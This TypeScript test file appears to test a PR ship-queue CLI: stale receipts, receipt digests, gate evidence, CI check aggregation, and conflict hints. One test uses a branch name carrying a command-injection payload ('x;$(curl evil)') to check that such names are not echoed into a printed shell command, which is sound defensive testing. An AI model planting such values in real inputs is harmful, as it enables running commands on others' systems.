  test('ready at the stamp commit accepts the receipt written for the pinned head; a real edit on top of the pin, a bare merge of main, or an edit on the pin side under the slot-2 stamp is stale', () => {
    const repo = fixture();
    const pin = makePr(repo, 'pr-s');
    fs.writeFileSync(path.join(repo.work, 'VERSION'), '1.2.4.0\n');
    repo.git('commit', '-qam', 'v1.2.4.0 stamp');
    const stamped = repo.git('rev-parse', 'HEAD');
    const shim = (prHead: string, body: string) => ghQueueShim(repo, { prs: { '1': { headRefOid: prHead, url: 'https://github.com/o/r/pull/1', body } }, checks: { [prHead]: green } });
    const ok = queue(repo, ['ready', '--pr', '1', '--pregate', pregateFor(repo, stamped)], shim(stamped, shippedBody('1', pin)));
    expect([ok.status, ok.err]).toEqual([EXIT.ok, '']);
    expect(ok.out.split('\n')[0]).toBe(`READY #1 ${stamped} STAMP_VERSION=1.2.4.0`);
    expect(ok.out).toContain(`SHIP_RECEIPT: pr=1 head=${pin.slice(0, 12)} version=- base=main`);
    repo.git('checkout', '-q', 'origin/main', '-B', 'main-moves');
    fs.writeFileSync(path.join(repo.work, 'other.txt'), 'another PR landed\n');
    repo.git('add', 'other.txt');
    repo.git('commit', '-qm', 'other PR');
    repo.git('push', '-q', 'origin', 'HEAD:main');
    repo.git('fetch', '-q', 'origin');
    repo.git('checkout', '-q', 'pr-s');
    repo.git('merge', '-q', '--no-edit', 'origin/main');
    fs.writeFileSync(path.join(repo.work, 'VERSION'), '1.2.5.0\n');
    repo.git('commit', '-qam', 'v1.2.5.0 stamp');
    const slot2 = repo.git('rev-parse', 'HEAD');
    const merged = queue(repo, ['ready', '--pr', '1', '--pregate', pregateFor(repo, slot2)], shim(slot2, shippedBody('1', pin)));
    expect([merged.status, merged.err]).toEqual([EXIT.ok, '']);
    expect(merged.out).toContain(`SHIP_RECEIPT: pr=1 head=${pin.slice(0, 12)} version=- base=main`);
    const staleRe = (h: string) => new RegExp(`PR #1's ship receipt is for ${pin.slice(0, 12)}, not the head ${h.slice(0, 12)} being merged.*\\(QUEUE_RECEIPT_STALE\\)`);
    const bareMerge = repo.git('rev-parse', 'HEAD^1');
    repo.git('reset', '-q', '--hard', bareMerge);
    const bare = queue(repo, ['ready', '--pr', '1', '--pregate', pregateFor(repo, bareMerge)], shim(bareMerge, shippedBody('1', pin)));
    expect(bare.status).toBe(EXIT.refused);
    expect(bare.err).toMatch(staleRe(bareMerge));
    repo.git('commit', '-q', '--allow-empty', '-m', 'empty commit is not a stamp');
    const emptyOnMerge = repo.git('rev-parse', 'HEAD');
    const empty = queue(repo, ['ready', '--pr', '1', '--pregate', pregateFor(repo, emptyOnMerge)], shim(emptyOnMerge, shippedBody('1', pin)));
    expect(empty.status).toBe(EXIT.refused);
    expect(empty.err).toMatch(staleRe(emptyOnMerge));
    repo.git('reset', '-q', '--hard', pin);
    fs.appendFileSync(path.join(repo.work, 'pr-s.txt'), 'real change before the merge\n');
    repo.git('commit', '-qam', 'edit on the pin side');
    repo.git('merge', '-q', '--no-edit', 'origin/main');
    fs.writeFileSync(path.join(repo.work, 'VERSION'), '1.2.5.0\n');
    repo.git('commit', '-qam', 'v1.2.5.0 stamp');
    const editedPin = repo.git('rev-parse', 'HEAD');
    const pinEdit = queue(repo, ['ready', '--pr', '1', '--pregate', pregateFor(repo, editedPin)], shim(editedPin, shippedBody('1', pin)));
    expect(pinEdit.status).toBe(EXIT.refused);
    expect(pinEdit.err).toMatch(staleRe(editedPin));
    repo.git('reset', '-q', '--hard', stamped);
    fs.appendFileSync(path.join(repo.work, 'pr-s.txt'), 'real change after /ship\n');
    repo.git('commit', '-qam', 'more');
    const edited = repo.git('rev-parse', 'HEAD');
    const stale = queue(repo, ['ready', '--pr', '1', '--pregate', pregateFor(repo, edited)], shim(edited, shippedBody('1', pin)));
    expect(stale.status).toBe(EXIT.refused);
    expect(stale.err).toMatch(new RegExp(`PR #1's ship receipt is for ${pin.slice(0, 12)}, not the head ${edited.slice(0, 12)} being merged.*\\(QUEUE_RECEIPT_STALE\\)`));
  }, 180_000);
});

describe('receipt digest', () => {
  const receipt = (files: Array<{ path: string; rule: string; verdict: string }>, extra: Partial<TreeReceipt> = {}) => ({
    gated_tree: 'a'.repeat(40), current_tree: 'b'.repeat(40), old_version: '1.2.3.0', new_version: '1.2.4.0',
    files, tree: 'same-modulo-stamps', stamp_diff: '-1.2.3.0\n+1.2.4.0', ...extra,
  }) as unknown as TreeReceipt;
  const files = [{ path: 'VERSION', rule: 'version', verdict: 'stamp-only' }, { path: 'CHANGELOG.md', rule: 'changelog', verdict: 'stamp-only' }];

  test('binds the proof fields and ignores file order, so verify compares the same receipt from any clone', () => {
    const d = receiptDigest(receipt(files));
    expect(d).toMatch(/^[0-9a-f]{64}$/);
    expect(receiptDigest(receipt([...files].reverse()))).toBe(d);
    expect(receiptDigest(receipt([files[0], { ...files[1], verdict: 'changed' }]))).not.toBe(d);
    expect(receiptDigest(receipt(files, { current_tree: 'c'.repeat(40) }))).not.toBe(d);
    expect(receiptDigest(receipt(files, { new_version: '1.2.5.0' }))).not.toBe(d);
  });
});

describe('full_e2e gate evidence (review #3235 P1-1)', () => {
  test('verify --gated refuses without a passing gate bound to the gated head; the lane run passes, a failing one refuses', () => {
    const repo = fixture(FULL_E2E);
    const head = makePr(repo, 'feature');
    publish(repo, '1');
    const coord = coordinatorClone(repo);
    const bare = queue(repo, ['verify', '--pr', '1', '--gated', head, '--expect-head', head], {}, coord);
    expect(bare.status).toBe(EXIT.refused);
    expect(bare.err).toMatch(/full_e2e is set and no gate result is bound to the gated head .*\(QUEUE_GATE_MISSING\)/);
    expect(bare.out).not.toContain('MERGE_CONDITION');
    const log = path.join(repo.root, 'gate.log');
    fs.writeFileSync(log, 'FAIL 1\n');
    const red = queue(repo, ['verify', '--pr', '1', '--gated', head, '--gate-exit', '1', '--gate-log', log], {}, coord);
    expect(red.status).toBe(EXIT.refused);
    expect(red.err).toMatch(/the gate on [0-9a-f]{12} exited 1; .*\(QUEUE_GATE_MISSING\)/);
    expect(queue(repo, ['verify', '--pr', '1', '--gated', head, '--gate-exit', '0'], {}, coord).err).toContain('(QUEUE_GATE_MISSING)');
    fs.writeFileSync(log, 'all passed\n');
    const ok = queue(repo, ['verify', '--pr', '1', '--gated', head, '--expect-head', head, '--gate-exit', '0', '--gate-log', log], {}, coord);
    expect(ok.status).toBe(EXIT.ok);
    expect(ok.out).toMatch(/^gate: exit 0 log_sha256=[0-9a-f]{64} \(lane run on gated [0-9a-f]{12}\)$/m);
    expect(line(ok.out, 'MERGE_CONDITION:')).toBe(`MERGE_CONDITION: sha=${head}`);
  }, 180_000);

  test('ready refuses with QUEUE_GATE_MISSING and a gate-evidence: missing line; the lane run on that head clears it', () => {
    const repo = fixture(FULL_E2E);
    const head = makePr(repo, 'feature');
    const tree = runBin(repo, 'gstack-wtree', []).out.trim();
    const pregate = path.join(repo.root, 'pregate.json');
    fs.writeFileSync(pregate, JSON.stringify({ schema_version: 1, tree, head, verdict: 'pass', checks: [{ id: 'unit', status: 'pass' }] }));
    const gh = ghQueueShim(repo, { prs: { '1': { headRefOid: head, body: shippedBody('1', head) } }, checks: { [head]: { check_runs: [{ status: 'completed', conclusion: 'success' }] } } });
    const missing = queue(repo, ['ready', '--pr', '1', '--pregate', pregate], gh);
    expect(missing.status).toBe(EXIT.refused);
    expect(missing.out).toContain(`gate-evidence: missing for ${head.slice(0, 12)}`);
    expect(missing.err).toContain('(QUEUE_GATE_MISSING)');
    const log = path.join(repo.root, 'gate.log');
    fs.writeFileSync(log, 'all passed\n');
    const ok = queue(repo, ['ready', '--pr', '1', '--pregate', pregate, '--gate-exit', '0', '--gate-log', log], gh);
    expect(ok.status).toBe(EXIT.ok);
    expect(ok.out).toMatch(new RegExp(`^gate-evidence: exit 0 log_sha256=[0-9a-f]{64} \\(lane run on ${head.slice(0, 12)}\\)$`, 'm'));
  }, 180_000);
});

describe('ready reads all of CI at the head (review #3235 P1-5)', () => {
  const pass = { status: 'completed', conclusion: 'success' };
  const hundred = Array.from({ length: 100 }, () => pass);
  function readyWith(checks: unknown, statuses?: unknown) {
    const repo = fixture();
    const head = makePr(repo, 'pr-a');
    const tree = runBin(repo, 'gstack-wtree', []).out.trim();
    const pregate = path.join(repo.root, 'pregate.json');
    fs.writeFileSync(pregate, JSON.stringify({ schema_version: 1, tree, head, verdict: 'pass', checks: [{ id: 'unit', status: 'pass' }] }));
    const gh = ghQueueShim(repo, { prs: { '1': { headRefOid: head, body: shippedBody('1', head) } }, checks: { [head]: checks }, ...(statuses ? { statuses: { [head]: statuses } } : {}) });
    return { r: queue(repo, ['ready', '--pr', '1', '--pregate', pregate], gh), at: head.slice(0, 12) };
  }

  test('a failed check run on page two is red', () => {
    const { r, at } = readyWith({ pages: [{ total_count: 101, check_runs: hundred }, { total_count: 101, check_runs: [{ status: 'completed', conclusion: 'failure' }] }] });
    expect(r.status).toBe(EXIT.refused);
    expect(line(r.out, 'ci: ')).toBe(`ci: red at ${at} (passed=100 failed=1 pending=0 skipped=0)`);
  }, 120_000);

  test('a failed or pending commit-status context is not green even when every check run passed', () => {
    const red = readyWith({ check_runs: [pass] }, { state: 'failure', statuses: [{ context: 'required-deploy', state: 'failure' }] });
    expect(red.r.status).toBe(EXIT.refused);
    expect(line(red.r.out, 'ci: ')).toBe(`ci: red at ${red.at} (passed=1 failed=1 pending=0 skipped=0)`);
    const pending = readyWith({ check_runs: [pass] }, { state: 'pending', statuses: [{ context: 'legacy', state: 'pending' }] });
    expect(line(pending.r.out, 'ci: ')).toBe(`ci: pending at ${pending.at} (passed=1 failed=0 pending=1 skipped=0)`);
  }, 120_000);

  test('a superseded run of a check is judged by its latest run, as GitHub\'s rollup counts (gbrain: a cancelled contributor-gate beside later passes)', () => {
    const older = { id: 1, name: 'contributor-gate', status: 'completed', conclusion: 'cancelled', completed_at: '2026-10-26T01:00:00Z' };
    const newer = { id: 2, name: 'contributor-gate', status: 'completed', conclusion: 'success', completed_at: '2026-10-26T01:10:00Z' };
    const other = { id: 3, name: 'free-tests', status: 'completed', conclusion: 'success', completed_at: '2026-10-26T01:05:00Z' };
    const ok = readyWith({ check_runs: [older, newer, other] });
    expect(ok.r.status).toBe(EXIT.ok);
    expect(line(ok.r.out, 'ci: ')).toBe(`ci: green at ${ok.at} (passed=2 failed=0 pending=0 skipped=0)`);
    const reversed = readyWith({ check_runs: [newer, older, other] });
    expect(line(reversed.r.out, 'ci: ')).toBe(`ci: green at ${reversed.at} (passed=2 failed=0 pending=0 skipped=0)`);
    const latestFailed = readyWith({ check_runs: [{ ...older, conclusion: 'success' }, { ...newer, conclusion: 'failure' }, other] });
    expect(latestFailed.r.status).toBe(EXIT.refused);
    expect(line(latestFailed.r.out, 'ci: ')).toBe(`ci: red at ${latestFailed.at} (passed=1 failed=1 pending=0 skipped=0)`);
    const rerunning = readyWith({ check_runs: [{ ...older, conclusion: 'failure' }, { id: 4, name: 'contributor-gate', status: 'in_progress' }, other] });
    expect(line(rerunning.r.out, 'ci: ')).toBe(`ci: pending at ${rerunning.at} (passed=1 failed=0 pending=1 skipped=0)`);
    const sameTime = readyWith({ check_runs: [{ ...older, id: 9, completed_at: newer.completed_at }, newer, other] });
    expect(line(sameTime.r.out, 'ci: ')).toBe(`ci: red at ${sameTime.at} (passed=1 failed=1 pending=0 skipped=0)`);
    const unnamed = readyWith({ check_runs: [{ status: 'completed', conclusion: 'cancelled' }, { status: 'completed', conclusion: 'success' }] });
    expect(line(unnamed.r.out, 'ci: ')).toBe(`ci: red at ${unnamed.at} (passed=1 failed=1 pending=0 skipped=0)`);
    const twoApps = readyWith({ check_runs: [{ ...older, conclusion: 'failure', app: { id: 1 } }, { ...newer, app: { id: 2 } }, other] });
    expect(line(twoApps.r.out, 'ci: ')).toBe(`ci: red at ${twoApps.at} (passed=2 failed=1 pending=0 skipped=0)`);
    const undated = readyWith({ check_runs: [{ id: 5, name: 'contributor-gate', status: 'completed', conclusion: 'failure' }, newer, other] });
    expect(line(undated.r.out, 'ci: ')).toBe(`ci: red at ${undated.at} (passed=2 failed=1 pending=0 skipped=0)`);
    const queued = readyWith({ check_runs: [{ ...older, conclusion: 'failure' }, { id: 6, name: 'contributor-gate', status: 'queued' }, other] });
    expect(line(queued.r.out, 'ci: ')).toBe(`ci: pending at ${queued.at} (passed=1 failed=0 pending=1 skipped=0)`);
    const nullConclusion = readyWith({ check_runs: [{ ...newer, conclusion: null }, other] });
    expect(line(nullConclusion.r.out, 'ci: ')).toBe(`ci: red at ${nullConclusion.at} (passed=1 failed=1 pending=0 skipped=0)`);
  }, 240_000);

  test('a commit-status context is never collapsed with a check run of the same name', () => {
    const r = readyWith({ check_runs: [{ id: 1, name: 'deploy', status: 'completed', conclusion: 'success', completed_at: '2026-10-26T01:00:00Z' }] }, { state: 'failure', statuses: [{ context: 'deploy', state: 'failure' }] });
    expect(line(r.r.out, 'ci: ')).toBe(`ci: red at ${r.at} (passed=1 failed=1 pending=0 skipped=0)`);
  }, 120_000);

  test('incomplete pagination is unknown, never green', () => {
    const { r, at } = readyWith({ total_count: 101, check_runs: hundred });
    expect(r.status).toBe(EXIT.refused);
    expect(line(r.out, 'ci: ')).toBe(`ci: unknown at ${at} (check_runs: read 100 of total_count=101)`);
  }, 120_000);
});

describe('ready on a PR that conflicts with the base (CHANGELOG-only conflicts, rule 14)', () => {
  const pass = { id: 1, name: 'Free Tests', status: 'completed', conclusion: 'success', completed_at: '2026-10-26T01:00:00Z' };
  function readyWith(mergeable: string, checks: unknown, pr: Record<string, unknown> = {}) {
    const repo = fixture();
    const head = makePr(repo, 'pr-a');
    const tree = runBin(repo, 'gstack-wtree', []).out.trim();
    const pregate = path.join(repo.root, 'pregate.json');
    fs.writeFileSync(pregate, JSON.stringify({ schema_version: 1, tree, head, verdict: 'pass', checks: [{ id: 'unit', status: 'pass' }] }));
    const gh = ghQueueShim(repo, { prs: { '1': { headRefOid: head, body: shippedBody('1', head), mergeable, headRefName: 'pr-a', ...pr } }, checks: { [head]: checks } });
    return { r: queue(repo, ['ready', '--pr', '1', '--pregate', pregate], gh), at: head.slice(0, 12) };
  }

  test('no CI at the head and a conflict: the refusal names the workflow_dispatch procedure', () => {
    const { r, at } = readyWith('CONFLICTING', { check_runs: [] });
    expect(r.status).toBe(EXIT.refused);
    expect(line(r.out, 'ci: ')).toBe(`ci: none at ${at} (passed=0 failed=0 pending=0 skipped=0)`);
    expect(line(r.out, 'ci-hint: ')).toBe(`ci-hint: PR conflicts with the base (no merge ref, so pull_request CI did not run on ${at}); dispatch the free workflows on the branch (gh workflow run free-tests.yml --ref pr-a && gh workflow run windows-free-tests.yml --ref pr-a), clear the pregate lanes with their run URLs (gstack-pregate clear --remote <lane> --run-url <run>), then rerun ready (advisory)`);
    for (const name of ['x;$(curl evil)', '--field']) {
      const odd = readyWith('CONFLICTING', { check_runs: [] }, { headRefName: name });
      expect(line(odd.r.out, 'ci-hint: ')).toContain('gh workflow run free-tests.yml --ref <branch> && gh workflow run windows-free-tests.yml --ref <branch>');
    }
    const fork = readyWith('CONFLICTING', { check_runs: [] }, { isCrossRepository: true });
    expect(line(fork.r.out, 'ci-hint: ')).toBe(`ci-hint: PR conflicts with the base (no merge ref, so pull_request CI did not run on ${fork.at}) and its head is on a fork, so the free workflows cannot be dispatched here; the coordinator decides (advisory)`);
  }, 240_000);

  test('dispatched runs green at the head and a conflict: READY, with the hint saying the dispatched runs count', () => {
    const { r, at } = readyWith('CONFLICTING', { check_runs: [pass] });
    expect(r.status).toBe(EXIT.ok);
    expect(line(r.out, 'ci-hint: ')).toBe(`ci-hint: PR conflicts with the base (no merge ref); the runs at ${at} were not pull_request runs (dispatched on the branch, or push-triggered), and they count (advisory)`);
  }, 120_000);

  test('no hint without a conflict, and none while the dispatched runs are red or pending', () => {
    expect(readyWith('MERGEABLE', { check_runs: [] }).r.out).not.toContain('ci-hint:');
    expect(readyWith('MERGEABLE', { check_runs: [pass] }).r.out).not.toContain('ci-hint:');
    expect(readyWith('CONFLICTING', { check_runs: [{ ...pass, conclusion: 'failure' }] }).r.out).not.toContain('ci-hint:');
    expect(readyWith('CONFLICTING', { check_runs: [{ ...pass, status: 'in_progress' }] }).r.out).not.toContain('ci-hint:');
  }, 240_000);
});

describe('printed gate-ahead command (review #3235 P2-1)', () => {
  test("next: runs as printed from a checkout whose path holds a space and an apostrophe", () => {
    const { repo } = twoLanes({ ...BASE_POLICY, gate_command: 'node -e "process.exit(0)"', min_gstack_version: SHIP_QUEUE_KEYS_VERSION }, "gstack sq o'fx-");
    const p = prepare(repo);
    expect(p.status).toBe(EXIT.ok);
    const next = line(p.out, 'next: ').slice(6);
    const r = spawnSync('bash', ['-c', next], { cwd: repo.work, encoding: 'utf8', timeout: 120_000, env: { ...process.env, ...repo.env, PATH: `${path.dirname(BIN('gstack-ship-queue'))}:${process.env.PATH ?? ''}` } });
    expect(r.stderr).toBe('');
    expect(line(r.stdout, 'GATE_RECORD:')).toMatch(new RegExp(`^GATE_RECORD: pr=2 attempt=${p.attempt} exit=0 `));
  }, 180_000);
});
